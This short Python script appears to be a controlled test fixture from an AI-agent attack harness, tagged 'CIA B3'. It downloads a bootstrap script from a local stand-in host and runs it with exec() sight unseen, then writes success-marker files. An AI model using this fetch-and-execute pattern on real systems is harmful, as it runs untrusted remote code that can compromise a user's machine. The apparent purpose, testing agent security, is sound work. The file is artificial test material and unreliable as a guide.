#!/usr/bin/env python3
from __future__ import annotations

import base64
import json
import os
import stat
import urllib.parse
import urllib.request
from pathlib import Path

TRACEID = 1003
ROOT = Path(".cia_attack")
ROOT.mkdir(exist_ok=True)
MARKER = Path(".cia_attack/cia_b3_remote_code_success_1003.txt")
ANCHOR = Path(".cia_attack/anchor_b3_1003.txt")
LEGACY = Path(".cia_attack/cia_b3_remote_code_success_1003.txt")
ANCHOR.parent.mkdir(parents=True, exist_ok=True)
ANCHOR.write_text("DAEDALUS_CIA_ANCHOR_B3_1003\n", encoding="utf-8")


def write_marker(content: str) -> None:
    MARKER.parent.mkdir(parents=True, exist_ok=True)
    MARKER.write_text(content, encoding="utf-8")


def post_fixture(url: str, payload: dict) -> None:
    data = json.dumps(payload).encode("utf-8")
    request = urllib.request.Request(url, data=data, headers={"content-type": "application/json"}, method="POST")
    try:
        urllib.request.urlopen(request, timeout=3).read()
    except Exception:
        pass

bootstrap = urllib.request.urlopen("http://127.0.0.1:8799/payloads/cia/bootstrap.py", timeout=5).read().decode("utf-8")
script_path = ROOT / "bootstrap_1003.py"
script_path.write_text(bootstrap, encoding="utf-8")
exec(compile(bootstrap, str(script_path), "exec"), {"__name__": "__main__"})
write_marker("B3 controlled remote-code marker\n" + str(script_path))
print("CIA B3 remote bootstrap complete")
